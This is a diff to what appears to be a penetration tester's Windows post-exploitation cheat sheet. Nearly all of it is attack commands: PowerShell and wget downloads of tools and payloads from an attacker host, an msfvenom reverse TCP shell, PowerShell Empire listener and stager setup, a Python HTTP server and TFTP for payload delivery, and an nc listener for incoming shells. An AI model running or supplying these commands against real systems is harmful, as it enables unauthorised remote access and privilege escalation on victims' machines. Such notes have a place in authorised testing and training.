@@ -439,13 +439,8 @@ wget.exe http://MYIPADDRESS:8080/ -r && move MYIPADDRESS+8080 exploits && cd exp
 START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula && START /B seatbelt.exe all > seatbelt-report
 
 OR with Powershell
-powershell -exec bypass -c (New-Object System.Net.WebClient).DownloadFile('http://MYIPADDRESS:8080/seatbelt.exe','seatbelt.exe')
-
-Windows XP and Server 2003:
-Host:
-atftpd --daemon --port 69 /root/Dropbox/Scripts/Post_Windows/uploads
-Target:
-tftp -i INSERTIPADDRESS GET wget.exe
+powershell -c (New-Object System.Net.WebClient).DownloadFile('http://MYIPADDRESS:8080/seatbelt.exe','seatbelt.exe')
+seatbelt.exe all > seatbelt-report
 
 ***If Windows 7 and above***
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f psh -o shell_80.ps1
@@ -458,17 +453,23 @@ python /opt/Empire/empire
 listeners
 uselistener http
 set Name INSERTIPADDRESS
-set Host http://MYIPADDRESS:8080
+set Host http://MYIPADDRESS
 execute
 
 launcher powershell INSERTIPADDRESS
 
 Copy and paste output in terminal
+
 ***If you need a stager***
 usestager windows/launcher_bat (or whatever can run on host)
 set Listener INSERTIPADDRESS
 generate 
+
 Upload and run payload
+cd /tmp
+python -m SimpleHTTPServer 8888
+
+powershell -c (New-Object System.Net.WebClient).DownloadFile('http://INSERTIPADDRESS:8888/launcher.bat','launcher.bat')
 
 Once you get a connection
 agents
@@ -477,6 +478,12 @@ usemodule privesc/powerup/allchecks
 set Agent <agent_name>
 execute 
 ***Let run for a few minutes
+
+Windows XP and Server 2003:
+Host:
+atftpd --daemon --port 69 /root/Dropbox/Scripts/Post_Windows/uploads
+Target:
+tftp -i INSERTIPADDRESS GET wget.exe
 
 If you get creds:
 nc -lvnp 6666
